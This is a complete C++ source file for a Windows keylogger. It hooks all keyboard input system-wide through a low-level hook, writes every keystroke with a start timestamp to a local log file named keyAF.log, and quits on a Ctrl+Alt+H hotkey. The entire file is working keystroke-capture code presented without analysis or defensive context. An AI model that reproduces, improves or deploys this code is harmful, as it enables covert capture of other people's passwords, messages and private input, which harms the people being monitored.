#include <iostream>
#include <Windows.h>
#include <fstream>
#include <string>
#include <sstream>
#include "time.h"

std::ofstream myfile("keyAF.log", std::ios::out | std::ios::app);
std::string keyValue;

LRESULT CALLBACK HookProcedure(int Code, WPARAM wParam, LPARAM lParam);

int main() {
	std::cout << "starting af\n";
	HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, HookProcedure, GetModuleHandle(NULL), 0);
	if (!keyboardHook) {
		std::cout << "Failed to hook keyboard\n";
	}
	else {
		std::cout << "capturing...\n";
		std::stringstream BeginMessage;
		SYSTEMTIME t;
		GetLocalTime(&t);
		int day = t.wDay;
		int month = t.wMonth;
		int year = t.wYear;
		int hour = t.wHour;
		int min = t.wMinute;
		int sec = t.wSecond;
		int dayName = t.wDayOfWeek;
		BeginMessage << "\n[+] " << t.wDay << "-" << t.wMonth << "-" << t.wYear << " || " << t.wHour << ':' << t.wMinute << ':' << t.wSecond << '\n';
		myfile.write(BeginMessage.str().c_str(), BeginMessage.str().length());
		MSG msg;
		while (GetMessage(&msg, NULL, 0, 0) > 0) {
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
	}
	std::cout << "Quitting...\n";
	UnhookWindowsHookEx(keyboardHook);
	return 0;
}

LRESULT CALLBACK HookProcedure(int nCode, WPARAM wParam, LPARAM lParam) {
	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)(lParam);
	if (keyValue.length() >= 2048) {
		myfile.write(keyValue.c_str(), keyValue.length());
		keyValue.clear();
	}
	if (wParam == WM_KEYDOWN) {
		switch (p->vkCode) {
		case VK_CAPITAL:	keyValue.append("<CAPLOCK>");	break;
		case VK_SHIFT:		keyValue.append("<SHIFT>");		break;
		//case VK_LCONTROL:	keyValue.append("<LCTRL>");		break;
		//case VK_RCONTROL:	keyValue.append("<RCTRL>");		break;
		//case VK_INSERT:	keyValue.append("<INSERT>");	break;
		//case VK_END:		keyValue.append("<END>");		break;
		//case VK_PRINT:	keyValue.append("<PRINT>");		break;
		//case VK_DELETE:	keyValue.append("<DEL>");		break;
		case VK_BACK:		keyValue.append("<BK>");		break;
		//case VK_LEFT:		keyValue.append("LEFT>");		break;
		//case VK_RIGHT:	keyValue.append("<RIGHT>");		break;
		//case VK_UP:		keyValue.append("<UP>");		break;
		//case VK_DOWN:		keyValue.append("<DOWN>");		break;
		case VK_RETURN:		keyValue.append("<RETURN>\n");	break;
		//case VK_MENU:		keyValue.append("<ALT>\n");		break;
		case VK_TAB:		keyValue.append("<TAB>");		break;
		default:
			keyValue += char(tolower(p->vkCode));
			break;
			//std::cout << char(tolower(p->vkCode));
		}
		if (GetAsyncKeyState(VK_CONTROL) && GetAsyncKeyState(VK_MENU) && GetAsyncKeyState(0x48)) {
			myfile.write(keyValue.c_str(), keyValue.length());
			myfile.close();
			PostQuitMessage(0);
		}
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}